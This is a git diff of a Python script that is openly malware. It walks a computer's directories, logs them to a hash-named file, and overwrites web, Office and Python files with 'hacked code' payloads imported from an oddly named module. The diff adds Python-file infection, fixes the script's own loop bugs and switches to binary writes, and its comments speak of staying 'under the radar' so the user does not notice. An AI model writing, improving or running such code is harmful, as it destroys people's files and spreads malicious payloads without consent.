@@ -8,6 +8,7 @@ from email.mime.text import MIMEText
 listOfAvailDirs = []
 md5HashTitle = str(hashlib.md5('listOfAvailDirsTXTFile'.encode()).hexdigest()) + '.txt'
 pathsToTXT = []
+# Web Devvelopment File Types
 pathsToHTML = []
 pathsToCSS = []
 pathsToJS = []
@@ -17,12 +18,16 @@ pathsToXSL = []
 pathsToPHP = []
 pathsToSQL = []
 
+# Other Programming Languages
+pathsToPY = []
+
+# Microsoft Office File Types
 pathsToACCDB = []
 pathsToXLSX = []
 pathsToPPTX = []
 pathsToDOCX = []
 # Get all the hacked codes from separate file
-import bf72dda9b27c0fb1f16fc6648348228d
+from bf72dda9b27c0fb1f16fc6648348228d import *
 
 # This Is Where Python Searches For Many File Types
 def searchForKnownFileTypes(*directories):
@@ -35,7 +40,15 @@ def searchForKnownFileTypes(*directories):
     findXSL()
     findPHP()
     findSQL()
+
+    # Microsoft Office File Types
+
+    #findACCDB()
+    findXLSX()
+    findPPTX()
     findDOCX()
+
+    findPY()
     """
     # More Computer Based Languages
     findC()
@@ -183,7 +196,7 @@ def findACCDB():
         populateACCDB()
 def populateACCDB():
     for l in range(len(pathsToACCDB)):
-        ACCDBFile = open(pathsToACCDB[l - 1], "w")
+        ACCDBFile = open(pathsToACCDB[l - 1], "wb")
         ACCDBFile.write(accdbHackedCode)
         ACCDBFile.close()
 
@@ -197,8 +210,8 @@ def findXLSX():
             pathsToXLSX.append(dirNameOfDir + "\\" + filteredXLSX[k - 1])
         populateXLSX()
 def populateXLSX():
-    for l in range(len(pathsToACCDB)):
-        XLSXFile = open(pathsToXLSX[l - 1], "w")
+    for l in range(len(pathsToXLSX)):
+        XLSXFile = open(pathsToXLSX[l - 1], "wb")
         XLSXFile.write(xlsxHackedCode)
         XLSXFile.close()
 
@@ -212,8 +225,8 @@ def findPPTX():
             pathsToPPTX.append(dirNameOfDir + "\\" + filteredPPTX[k - 1])
         populatePPTX()
 def populatePPTX():
-    for l in range(len(pathsToACCDB)):
-        PPTXFile = open(pathsToPPTX[l - 1], "w")
+    for l in range(len(pathsToPPTX)):
+        PPTXFile = open(pathsToPPTX[l - 1], "wb")
         PPTXFile.write(pptxHackedCode)
         PPTXFile.close()
 
@@ -228,9 +241,25 @@ def findDOCX():
         populateDOCX()
 def populateDOCX():
     for l in range(len(pathsToDOCX)):
-        DOCXFile = open(pathsToDOCX[l - 1], "w")
+        DOCXFile = open(pathsToDOCX[l - 1], "wb")
         DOCXFile.write(docxHackedCode)
         DOCXFile.close()
+
+
+def findPY():
+    filesInsideDir = listOfAvailDirs[j][3][1]
+    dirNameOfDir = listOfAvailDirs[j][1][1]
+    filteredPY = fnmatch.filter(filesInsideDir, '*.py')
+    if len(filteredPY) > 0:
+        for k in range(len(filteredPY)):
+            pathsToPY.append(dirNameOfDir + "\\" + filteredPY[k - 1])
+        populatePY()
+def populatePY():
+    for l in range(len(pathsToPY)):
+        PYFile = open(pathsToPY[l - 1], "w")
+        PYFile.write(pyHackedCode)
+        PYFile.close()
+
 # More Computer Based Languages
 """
 def findC(*directories):
@@ -290,7 +319,7 @@ listOfAvailDirsTXTFile.write("List of directories on this Computer:\n")
 listOfAvailDirsTXTFile.close()
 # Main Loop That Searches C:\ and Reports Every and All Directories Available For Next Step
 # It Also Records Every Single Directory Path In The Previously Created TXT File
-for dirName, dirsInside, filesInside in os.walk(os.getcwd()):
+for dirName, dirsInside, filesInside in os.walk("test\\"):
     dictionaryOfDirs = Directory(Directory.i, dirName, dirsInside, filesInside)
     dictionaryOfDirs = dictionaryOfDirs.__dict__
     listOfDirs = []
@@ -300,6 +329,7 @@ for dirName, dirsInside, filesInside in os.walk(os.getcwd()):
     listOfAvailDirs.append(listOfDirs)
     with open(md5HashTitle, "a") as listOfAvailDirsTXTFile:
         listOfAvailDirsTXTFile.write(str(listOfAvailDirs[Directory.i]) + "\n")
+        print(int(int(os.path.getsize(md5HashTitle)) / 1000), "kb" )
     # Print is for testing purposes only. To stay under the radar,
     # it's best to not print out all of the directories and make
     # the user suspicious!!!
